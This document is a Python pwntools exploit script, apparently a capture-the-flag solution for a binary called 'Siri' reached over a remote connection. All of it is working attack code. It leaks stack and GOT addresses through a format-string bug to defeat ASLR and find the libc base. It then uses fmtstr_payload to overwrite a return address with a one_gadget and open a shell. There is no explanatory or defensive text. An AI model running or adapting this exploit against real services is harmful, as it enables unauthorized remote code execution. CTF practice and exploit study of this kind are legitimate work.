from pwn import *

context.arch = "amd64"
context.terminal = ('open-wsl.exe', "-e")
context.log_level = "debug"
# io = gdb.debug("./Siri", env={"LD_PRELOAD":"./x64-libc-2.23.so"}, aslr=False)
io = remote("everything411.top", 10000)
elf = ELF("./Siri")
libc = ELF("./x64-libc-2.23.so")

def execute_fmt(payload):
    # log.info(repr(payload))
    io.sendlineafter(">>> ", b"Hey Siri!")
    io.sendlineafter("you?\n>>> ", b"Remind me to " + payload)
    ret = io.recvline()
    # log.info(repr(ret))
    return ret

def leak_stack(offset, prefix=b""):
    payload = b"START%%%d$pEND" % offset
    leak = execute_fmt(prefix + payload)
    try:
        leak = re.findall(br"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]
        leak = int(leak, 16)
    except ValueError:
        leak = 0
    return leak

sub1212_ret_offset = 0x144c
main_rbp = leak_stack(46)
sub1212_ret_addr = leak_stack(47)
# 0x7fffffffdb90 —▸ 0x7fffffffdcb0 == 0x120
sub1212_rbp = main_rbp - 0x120
sub1212_ret = sub1212_rbp + 8

elfbase = sub1212_ret_addr - sub1212_ret_offset
log.success("elfbase %#x main_rbp %#x" % (elfbase, main_rbp))
leak_payload = b"aaa%51$saaa" + p64(elfbase + elf.got["alarm"])

alarm_addr = execute_fmt(leak_payload)
alarm_addr = u64(alarm_addr[-16:-10]+b"\x00\x00")
libcbase = alarm_addr - libc.symbols["alarm"]
log.success("alarm_addr %#x libcbase %#x" % (alarm_addr, libcbase))

one_gadget = libcbase + 0xf1207

def memwrite(addr, data):
    log.info("write %x to %x" % (data, addr))
    memwrite_payload = b'aaa' + fmtstr_payload(offset=50, writes={addr: data}, numbwritten=0x1b + 3, write_size='short')
    execute_fmt(memwrite_payload)

memwrite(sub1212_ret, one_gadget)
io.interactive()
io.close()
